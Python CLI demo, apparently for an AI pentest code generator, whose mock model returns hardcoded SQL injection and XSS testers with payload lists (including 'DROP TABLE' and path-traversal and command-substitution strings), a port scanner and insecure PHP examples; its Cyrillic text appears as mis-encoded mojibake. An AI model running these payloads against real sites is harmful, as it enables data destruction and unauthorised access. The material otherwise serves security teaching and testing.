"""
–î–µ–º–æ-–≤–µ—Ä—Å–∏—è CLI –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –¥–ª—è my-pentest-gpt
–†–∞–±–æ—Ç–∞–µ—Ç –±–µ–∑ ML –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã
"""
import typer
from typing import Optional
from pathlib import Path
from datetime import datetime
import json

from .config import ensure_directories, PROMPTS_DIR
from .prompt_manager import get_template
from .thinker import apply_think, ThinkingEngine
from .formatter import format_markdown

app = typer.Typer(
    name="my-pentest-gpt-demo",
    help="üõ°Ô∏è AI-–∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (–î–µ–º–æ –≤–µ—Ä—Å–∏—è)",
    epilog="–°–æ–∑–¥–∞–Ω–æ —ç–∫—Å–ø–µ—Ä—Ç–æ–º –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π."
)

def mock_generate_code(system_prompt: str, user_prompt: str, **kwargs) -> str:
    """
    –ú–æ–∫-—Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–æ–¥–∞
    –í —Ä–µ–∞–ª—å–Ω–æ–π –≤–µ—Ä—Å–∏–∏ –∑–¥–µ—Å—å –±—É–¥–µ—Ç DeepSeek-R1-8B
    """

    if "SQL" in user_prompt or "sql" in user_prompt.lower():
        return generate_sql_injection_example()
    elif "XSS" in user_prompt or "xss" in user_prompt.lower():
        return generate_xss_example()
    elif "—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ" in user_prompt.lower() or "–ø–æ—Ä—Ç" in user_prompt.lower():
        return generate_port_scanner_example()
    elif "–∞–Ω–∞–ª–∏–∑" in user_prompt.lower():
        return generate_code_analysis_example()
    else:
        return generate_generic_exploit_example()

def generate_sql_injection_example() -> str:
    """–ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞ –¥–ª—è SQL –∏–Ω—ä–µ–∫—Ü–∏–∏"""
    return '''```python
import requests
import urllib.parse

def test_sql_injection(url, param_name="username"):
    """
    –¢–µ—Å—Ç–∏—Ä—É–µ—Ç –≤–µ–±-—Ñ–æ—Ä–º—É –Ω–∞ SQL –∏–Ω—ä–µ–∫—Ü–∏—é
    –¢–û–õ–¨–ö–û –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!
    """

    payloads = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL,NULL,NULL --",
        "'; DROP TABLE users; --"
    ]

    print("[*] –ù–∞—á–∏–Ω–∞–µ–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏...")

    for payload in payloads:
        data = {param_name: payload}

        try:
            response = requests.post(url, data=data, timeout=5)

            error_indicators = [
                "sql syntax", "mysql_fetch", "ora-", "postgresql",
                "syntax error", "quoted string", "unclosed quotation"
            ]

            if any(error in response.text.lower() for error in error_indicators):
                print(f"[!] –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è SQL –∏–Ω—ä–µ–∫—Ü–∏—è: {payload}")
                return True

            if any(keyword in response.text.lower() for keyword in ["welcome", "dashboard", "admin"]):
                print(f"[!] –í–æ–∑–º–æ–∂–Ω–∞—è SQL –∏–Ω—ä–µ–∫—Ü–∏—è (–æ–±—Ö–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏): {payload}")
                return True

        except requests.RequestException as e:
            print(f"–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞: {e}")

    print("[*] SQL –∏–Ω—ä–µ–∫—Ü–∏—è –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞")
    return False


if __name__ == "__main__":
    target_url = "http://vulnerable-site.com/login"
    test_sql_injection(target_url)
```'''

def generate_xss_example() -> str:
    """–ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞ –¥–ª—è XSS —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"""
    return '''```python
import requests
from urllib.parse import urlencode

def test_xss_vulnerability(url, params=None):
    """
    –¢–µ—Å—Ç–∏—Ä—É–µ—Ç –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–∏
    –¢–û–õ–¨–ö–û –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!
    """

    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]

    if not params:
        params = {'search': '', 'q': '', 'name': ''}

    print("[*] –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π...")

    for param_name in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                response = requests.get(url, params=test_params, timeout=5)

                if payload in response.text:
                    print(f"[!] –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è XSS –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ '{param_name}': {payload}")

                    if "<script>" in payload and "<script>" in response.text:
                        print(f"[!!] –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø XSS - —Å–∫—Ä–∏–ø—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω!")

            except requests.RequestException as e:
                print(f"–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞: {e}")

    print("[*] XSS —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")


if __name__ == "__main__":
    target_url = "http://vulnerable-site.com/search"
    test_params = {'q': 'test', 'search': 'test'}
    test_xss_vulnerability(target_url, test_params)
```'''

def generate_port_scanner_example() -> str:
    """–ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞ –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–æ–≤"""
    return '''```python
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse

def scan_port(host, port, timeout=1):
    """–°–∫–∞–Ω–∏—Ä—É–µ—Ç –æ–¥–∏–Ω –ø–æ—Ä—Ç"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            if result == 0:
                service = get_service_name(port)
                print(f"[+] –ü–æ—Ä—Ç {port} –æ—Ç–∫—Ä—ã—Ç - {service}")
                return port
    except:
        pass
    return None

def get_service_name(port):
    """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Å–µ—Ä–≤–∏—Å –ø–æ –ø–æ—Ä—Ç—É"""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 993: "IMAPS", 995: "POP3S"
    }
    return services.get(port, "Unknown")

def port_scanner(host, start_port=1, end_port=1000, threads=100):
    """–ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω—ã–π —Å–∫–∞–Ω–µ—Ä –ø–æ—Ä—Ç–æ–≤"""
    print(f"[*] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ {host} –ø–æ—Ä—Ç–æ–≤ {start_port}-{end_port}")

    open_ports = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(scan_port, host, port): port
            for port in range(start_port, end_port + 1)
        }

        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)

    print(f"[*] –ù–∞–π–¥–µ–Ω–æ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤: {len(open_ports)}")
    return sorted(open_ports)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="–¶–µ–ª–µ–≤–æ–π —Ö–æ—Å—Ç")
    parser.add_argument("-p", "--ports", default="1-1000")

    args = parser.parse_args()
    start, end = map(int, args.ports.split('-'))

    port_scanner(args.host, start, end)
```'''

def generate_code_analysis_example() -> str:
    """–ü—Ä–∏–º–µ—Ä –∞–Ω–∞–ª–∏–∑–∞ –∫–æ–¥–∞ –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏"""
    return '''


- **–û–ø–∏—Å–∞–Ω–∏–µ**: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ eval() —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º–∏ –¥–∞–Ω–Ω—ã–º–∏
- **–†–∏—Å–∫**: –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
- **–†–µ—à–µ–Ω–∏–µ**: –ó–∞–º–µ–Ω–∏—Ç—å –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã

- **–û–ø–∏—Å–∞–Ω–∏–µ**: –ü—Ä—è–º–∞—è –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ SQL –∑–∞–ø—Ä–æ—Å
- **–†–∏—Å–∫**: –£—Ç–µ—á–∫–∞ –¥–∞–Ω–Ω—ã—Ö, –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –ë–î
- **–†–µ—à–µ–Ω–∏–µ**: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã

- **–û–ø–∏—Å–∞–Ω–∏–µ**: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–∏ –≤—ã–≤–æ–¥–µ
- **–†–∏—Å–∫**: –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–æ–≤ –≤ –±—Ä–∞—É–∑–µ—Ä–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- **–†–µ—à–µ–Ω–∏–µ**: htmlspecialchars() –¥–ª—è –≤—Å–µ—Ö –≤—ã–≤–æ–¥–∏–º—ã—Ö –¥–∞–Ω–Ω—ã—Ö


```php
// –ù–ï–ë–ï–ó–û–ü–ê–°–ù–û:
eval($_POST['code']);
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
echo $_POST['comment'];

// –ë–ï–ó–û–ü–ê–°–ù–û:
// –£–±—Ä–∞—Ç—å eval() –ø–æ–ª–Ω–æ—Å—Ç—å—é
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
echo htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
```'''

def generate_generic_exploit_example() -> str:
    """–û–±—â–∏–π –ø—Ä–∏–º–µ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–∞"""
    return '''```python
import requests
import sys
import argparse

class VulnerabilityTester:
    """
    –ë–∞–∑–æ–≤—ã–π –∫–ª–∞—Å—Å –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
    –¢–û–õ–¨–ö–û –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!
    """

    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []

    def test_common_vulnerabilities(self):
        """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –æ–±—â–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏"""

        print("[*] –ù–∞—á–∏–Ω–∞–µ–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π...")

        self.check_server_info()

        self.test_input_validation()

        self.check_security_headers()

        self.print_results()

    def check_server_info(self):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ—Ä–≤–µ—Ä–µ"""
        try:
            response = self.session.get(self.target)

            server = response.headers.get('Server', 'Unknown')
            print(f"[*] –°–µ—Ä–≤–µ—Ä: {server}")

            if any(old_version in server.lower() for old_version in ['apache/2.2', 'nginx/1.0']):
                self.vulnerabilities.append({
                    'type': 'Outdated Server',
                    'severity': 'Medium',
                    'description': f'–£—Å—Ç–∞—Ä–µ–≤—à–∞—è –≤–µ—Ä—Å–∏—è —Å–µ—Ä–≤–µ—Ä–∞: {server}'
                })

        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å–µ—Ä–≤–µ—Ä–∞: {e}")

    def test_input_validation(self):
        """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –≤–∞–ª–∏–¥–∞—Ü–∏—é –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""

        test_payloads = [
            "'; DROP TABLE test; --",
            "<script>alert('test')</script>",
            "../../../etc/passwd",
            "$(whoami)"
        ]

        for payload in test_payloads:
            try:
                response = self.session.get(self.target, params={'test': payload})

                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'Input Validation',
                        'severity': 'High',
                        'description': f'–û—Ç—Ä–∞–∂–µ–Ω–∏–µ payload: {payload[:50]}'
                    })

            except Exception as e:
                print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ payload: {e}")

    def check_security_headers(self):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∑–∞–≥–æ–ª–æ–≤–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""

        try:
            response = self.session.get(self.target)
            headers = response.headers

            security_headers = [
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Content-Security-Policy',
                'Strict-Transport-Security'
            ]

            missing_headers = []
            for header in security_headers:
                if header not in headers:
                    missing_headers.append(header)

            if missing_headers:
                self.vulnerabilities.append({
                    'type': 'Missing Security Headers',
                    'severity': 'Low',
                    'description': f'–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –∑–∞–≥–æ–ª–æ–≤–∫–∏: {", ".join(missing_headers)}'
                })

        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤: {e}")

    def print_results(self):
        """–í—ã–≤–æ–¥–∏—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"""

        print(f"\n[*] –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")
        print(f"[*] –ù–∞–π–¥–µ–Ω–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {len(self.vulnerabilities)}")

        if self.vulnerabilities:
            print("\nüîç –ù–ê–ô–î–ï–ù–ù–´–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. {vuln['type']} ({vuln['severity']})")
                print(f"   {vuln['description']}")

if __name__ == "__main__":
    print("üö® –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï: –¢–û–õ–¨–ö–û –î–õ–Ø –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–´–• –¶–ï–õ–ï–ô! üö®")
    print("‚úÖ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö!")
    print("‚ùå –õ—é–±–æ–µ –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∑–∞–ø—Ä–µ—â–µ–Ω–æ!\n")

    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="URL –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è")
    args = parser.parse_args()

    tester = VulnerabilityTester(args.url)
    tester.test_common_vulnerabilities()
```'''

@app.command()
def generate(
    task: str = typer.Argument(..., help="–¢–∏–ø –∑–∞–¥–∞—á–∏"),
    prompt_set: str = typer.Option("default", "--prompt-set", "-p"),
    think: bool = typer.Option(True, "--think/--no-think"),
    output: Optional[Path] = typer.Option(None, "--output", "-o"),
    target: Optional[str] = typer.Option(None, "--target"),
    custom_prompt: Optional[str] = typer.Option(None, "--custom")
):
    """üöÄ –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –∫–æ–¥ –¥–ª—è –∑–∞–¥–∞—á –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (–¥–µ–º–æ –≤–µ—Ä—Å–∏—è)"""

    print("üõ°Ô∏è my-pentest-gpt - AI –ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä –¥–ª—è –ö–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (–î–ï–ú–û)")
    print("="*60)

    try:
        template_data = get_template(task, prompt_set)
        user_prompt = custom_prompt or template_data["user_template"]

        if target:
            user_prompt += f"\n\n–¶–µ–ª—å: {target}"

        task_type = _detect_task_type(task)
        enhanced_prompt = apply_think(user_prompt, think, task_type)

        print(f"[*] –ó–∞–¥–∞—á–∞: {task}")
        print(f"[*] –ù–∞–±–æ—Ä –ø—Ä–æ–º–ø—Ç–æ–≤: {prompt_set}")
        print(f"[*] Chain-of-Thought: {'–≤–∫–ª—é—á–µ–Ω' if think else '–≤—ã–∫–ª—é—á–µ–Ω'}")
        print(f"[*] –ì–µ–Ω–µ—Ä–∞—Ü–∏—è...")

        generated_text = mock_generate_code(
            template_data["system_prompt"],
            enhanced_prompt
        )

        thinking_engine = ThinkingEngine()
        code, reasoning = thinking_engine.extract_reasoning(generated_text)

        if not code:
            code = generated_text

        metadata = {
            "model": "DeepSeek-R1-8B (–î–µ–º–æ)",
            "temperature": 0.7,
            "max_tokens": 512,
            "thinking_enabled": think,
            "timestamp": datetime.now().isoformat()
        }

        task_info = {
            "task_name": task,
            "description": template_data.get("description", ""),
            "target": target or "–ù–µ —É–∫–∞–∑–∞–Ω–∞"
        }

        formatted_result = format_markdown(code, reasoning, task_info, metadata)

        print("\n" + "="*60)
        print(formatted_result)
        print("="*60)

        if output:
            output.parent.mkdir(parents=True, exist_ok=True)
            with open(output, 'w', encoding='utf-8') as f:
                f.write(formatted_result)
            print(f"\n‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤: {output}")

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        raise typer.Exit(1)

@app.command()
def list_templates():
    """üìã –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —à–∞–±–ª–æ–Ω–æ–≤"""
    from .prompt_manager import prompt_manager

    templates = prompt_manager.list_templates()

    if not templates:
        print("‚ö†Ô∏è –®–∞–±–ª–æ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
        return

    print("üìã –î–æ—Å—Ç—É–ø–Ω—ã–µ —à–∞–±–ª–æ–Ω—ã:\n")

    for template in templates:
        print(f"‚Ä¢ {template['name']}: {template['description']}")

@app.command()
def setup():
    """‚öôÔ∏è –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç —Ä–∞–±–æ—á—É—é —Å—Ä–µ–¥—É"""
    print("üîß –ù–∞—Å—Ç—Ä–æ–π–∫–∞ my-pentest-gpt (–¥–µ–º–æ –≤–µ—Ä—Å–∏—è)")
    print("="*50)

    try:
        ensure_directories()
        print("‚úÖ –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π —Å–æ–∑–¥–∞–Ω–∞")
        print("‚úÖ –ü—Ä–æ–º–ø—Ç—ã –∑–∞–≥—Ä—É–∂–µ–Ω—ã")
        print("\nüéâ –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!")
        print("\n–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:")
        print("python -m src.cli_demo generate generate_exploit --target 'SQL injection'")

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏: {e}")
        raise typer.Exit(1)

def _detect_task_type(task: str) -> str:
    """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Ç–∏–ø –∑–∞–¥–∞—á–∏"""
    if "analyze" in task.lower():
        return "analyze"
    elif "reverse" in task.lower():
        return "reverse"
    else:
        return "exploit"

if __name__ == "__main__":
    app()
